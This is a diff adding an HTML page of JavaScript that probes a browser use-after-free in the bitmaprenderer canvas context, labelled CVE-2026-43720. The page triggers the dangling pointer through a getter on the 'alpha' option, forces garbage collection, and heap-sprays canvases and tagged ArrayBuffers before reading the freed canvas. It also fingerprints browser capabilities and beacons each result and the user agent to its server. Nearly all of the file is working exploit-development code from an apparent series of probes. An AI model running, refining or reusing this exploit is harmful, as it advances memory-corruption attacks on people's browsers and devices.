@@ -1,0 +1,248 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635l-slim</title></head>
+<body><pre id="out">p635l-slim: bmr dangling pointer spray (low memory)</pre>
+<script>
+'use strict';
+/*
+  p635l-slim: CVE-2026-43720 — bmr.canvas dangling pointer exploitation
+  -- prior art: p635h confirmed bmr.canvas CRASH every time
+  -- prior art: p635i confirmed tfib(null) OK, tfib(bitmap) CRASH
+  -- Memory-optimized: small canvases, minimal spray sizes
+
+  CRASH_CLASS: HIGH — Phase C/D intentionally access dangling pointer
+
+  Strategy:
+  A) bmr introspection (safe, no .canvas access)
+  B) Capability scan (WeakRef, FinalizationRegistry, Worker, WASM)
+  C) Orphan canvas + GC + spray + bmr.canvas (RISKY)
+  D) If C crashes: alternative will be in next probe
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635L-' + tag + (d !== undefined ? '-' + String(d).slice(0, 600) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635l-slim', msg:msg, level:'info', sid:'p635ls-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+function triggerUAF_bmrOnly() {
+  // Returns {bmr, weakref?} — NO references to canvas or inner kept
+  var bmr = null;
+  var wr = null;
+  (function() {
+    var cv = document.createElement('canvas');
+    cv.width = 16; cv.height = 16; // minimal size
+    if (typeof WeakRef !== 'undefined') {
+      try { wr = new WeakRef(cv); } catch(e) {}
+    }
+    var inner = null;
+    var opts = {};
+    Object.defineProperty(opts, 'alpha', {
+      get: function() { inner = cv.getContext('2d'); return true; }
+    });
+    bmr = cv.getContext('bitmaprenderer', opts);
+    // Drop all refs except bmr
+    inner = null;
+    cv = null;
+    opts = null;
+  })();
+  return {bmr: bmr, wr: wr};
+}
+
+function forceGC() {
+  for (var r = 0; r < 3; r++) {
+    var trash = [];
+    for (var i = 0; i < 500; i++) trash.push(new ArrayBuffer(2048));
+    trash = null;
+  }
+  try { if (typeof gc === 'function') gc(); } catch(e) {}
+}
+
+// ================================================================
+// PHASE A: bmr introspection (SAFE — no .canvas access)
+// ================================================================
+bk('A-START', 'bmr introspection');
+
+var testUaf = (function() {
+  var cv = document.createElement('canvas');
+  cv.width = 16; cv.height = 16;
+  var inner = null;
+  var bmr = null;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  bmr = cv.getContext('bitmaprenderer', opts);
+  return {bmr: bmr, inner: inner, cv: cv};
+})();
+
+if (testUaf.bmr) {
+  try { bk('A-CTOR', testUaf.bmr.constructor.name); } catch(e) { bk('A-CTOR', 'ERR'); }
+
+  try {
+    var proto = Object.getPrototypeOf(testUaf.bmr);
+    bk('A-PROTO', Object.getOwnPropertyNames(proto).join(','));
+  } catch(e) { bk('A-PROTO', 'ERR'); }
+
+  try {
+    var cd = Object.getOwnPropertyDescriptor(proto, 'canvas');
+    bk('A-CDESC', 'get=' + typeof cd.get + ' set=' + typeof cd.set + ' conf=' + cd.configurable);
+  } catch(e) { bk('A-CDESC', 'ERR'); }
+
+  // Re-getContext checks
+  try {
+    var r2d = testUaf.cv.getContext('2d');
+    bk('A-REGET2D', r2d === testUaf.inner ? 'SAME' : (r2d ? 'DIFF' : 'NULL'));
+  } catch(e) { bk('A-REGET2D', 'ERR'); }
+
+  try {
+    var rbmr = testUaf.cv.getContext('bitmaprenderer');
+    bk('A-REGETBMR', rbmr === testUaf.bmr ? 'SAME' : (rbmr ? 'DIFF' : 'NULL'));
+  } catch(e) { bk('A-REGETBMR', 'ERR'); }
+
+  // toDataURL on the canvas (uses active context, not bmr.canvas getter)
+  try {
+    var url = testUaf.cv.toDataURL('image/png');
+    bk('A-DATAURL', 'len=' + url.length);
+  } catch(e) { bk('A-DATAURL', 'ERR:' + e.message.slice(0,40)); }
+
+  // Can we call the .canvas getter on a DIFFERENT context?
+  // Get the getter function, then .call() it on something else
+  try {
+    var getter = Object.getOwnPropertyDescriptor(proto, 'canvas').get;
+    bk('A-GETTER', typeof getter);
+    // Call on inner (2d context) — type mismatch, should throw
+    try {
+      var result = getter.call(testUaf.inner);
+      bk('A-GETTER-INNER', 'type=' + typeof result + ' tag=' + (result && result.tagName));
+    } catch(e2) {
+      bk('A-GETTER-INNER', 'threw:' + e2.message.slice(0,50));
+    }
+    // Call on a plain object — should throw TypeError
+    try {
+      var result2 = getter.call({});
+      bk('A-GETTER-OBJ', typeof result2);
+    } catch(e3) {
+      bk('A-GETTER-OBJ', 'threw:' + e3.message.slice(0,50));
+    }
+  } catch(e) { bk('A-GETTER', 'ERR:' + e.message.slice(0,40)); }
+}
+
+// Free test UAF
+testUaf = null;
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: Capability scan
+// ================================================================
+bk('B-START', 'capabilities');
+try { bk('B-WASM', typeof WebAssembly); } catch(e) { bk('B-WASM', 'absent'); }
+try { bk('B-WORKER', typeof Worker); } catch(e) { bk('B-WORKER', 'absent'); }
+try { bk('B-SAB', typeof SharedArrayBuffer); } catch(e) { bk('B-SAB', 'absent'); }
+try { bk('B-WEAKREF', typeof WeakRef); } catch(e) { bk('B-WEAKREF', 'absent'); }
+try { bk('B-FINREG', typeof FinalizationRegistry); } catch(e) { bk('B-FINREG', 'absent'); }
+try { bk('B-ATOMICS', typeof Atomics); } catch(e) { bk('B-ATOMICS', 'absent'); }
+try {
+  var p = performance.now();
+  bk('B-PERF', 'res=' + (p % 1 !== 0 ? 'sub-ms' : 'ms') + ' val=' + p);
+} catch(e) { bk('B-PERF', 'absent'); }
+
+// Worker test (inline, minimal)
+try {
+  var blob = new Blob(['postMessage("ok")'], {type:'application/javascript'});
+  var wurl = URL.createObjectURL(blob);
+  var w = new Worker(wurl);
+  var walive = false;
+  w.onmessage = function(e) { walive = true; bk('B-WORKER-OK', e.data); w.terminate(); };
+  w.onerror = function(e) { bk('B-WORKER-ERR', e.message ? e.message.slice(0,40) : '?'); };
+  var ws = Date.now(); while (Date.now() - ws < 300 && !walive) {}
+  if (!walive) bk('B-WORKER-TIMEOUT', 'no reply 300ms');
+  URL.revokeObjectURL(wurl);
+} catch(e) { bk('B-WORKER-CREATE', 'ERR:' + e.message.slice(0,40)); }
+
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: Orphan canvas + GC + spray + bmr.canvas
+// THIS PHASE MAY CRASH THE WEBPROCESS
+// ================================================================
+bk('C-START', 'orphan+GC+spray');
+
+var uaf = triggerUAF_bmrOnly();
+bk('C-TRIGGER', 'bmr=' + !!uaf.bmr + ' wr=' + !!uaf.wr);
+
+if (uaf.bmr) {
+  // Check WeakRef before GC
+  if (uaf.wr) {
+    bk('C-WR-PRE', uaf.wr.deref() ? 'alive' : 'dead');
+  }
+
+  // Force GC
+  forceGC();
+  var gcw = Date.now(); while (Date.now() - gcw < 150) {}
+  forceGC();
+
+  // Check WeakRef after GC
+  if (uaf.wr) {
+    var alive = uaf.wr.deref();
+    bk('C-WR-POST', alive ? 'STILL-ALIVE(bmr prevents GC)' : 'COLLECTED');
+
+    if (alive) {
+      // Canvas NOT collected — bmr prevents GC
+      // Try to break the ref: override prototype, delete properties
+      bk('C-SKIP', 'canvas alive, spray pointless — bmr prevents GC');
+    }
+  }
+
+  // Spray regardless (if WeakRef absent, we don't know GC status)
+  var skipSpray = uaf.wr && uaf.wr.deref();
+  if (!skipSpray) {
+    bk('C-SPRAY', 'spraying 500 canvases + 500 AB');
+    var sprayC = [];
+    for (var i = 0; i < 500; i++) {
+      var sc = document.createElement('canvas');
+      sc.width = 16; sc.height = 16;
+      sc.id = 'sp' + i;
+      sprayC.push(sc);
+    }
+    for (var i = 0; i < 500; i++) {
+      var ab = new ArrayBuffer(128);
+      new Uint32Array(ab)[0] = 0xDEAD0000 | i;
+      sprayC.push(ab);
+    }
+
+    bk('C-ACCESS', 'reading bmr.canvas NOW');
+    try {
+      var c = uaf.bmr.canvas;
+      bk('C-WIN', 'type=' + typeof c);
+      if (c) {
+        try { bk('C-WIN-TAG', c.tagName); } catch(e2) {}
+        try { bk('C-WIN-ID', c.id || 'none'); } catch(e2) {}
+        try { bk('C-WIN-WH', c.width + 'x' + c.height); } catch(e2) {}
+      } else {
+        bk('C-WIN-NULL', String(c));
+      }
+    } catch(e) {
+      bk('C-ERR', e.message.slice(0,60));
+    }
+    bk('C-SURVIVED', 'no crash');
+    sprayC = null;
+  }
+}
+
+bk('C-DONE', 'phase C complete');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
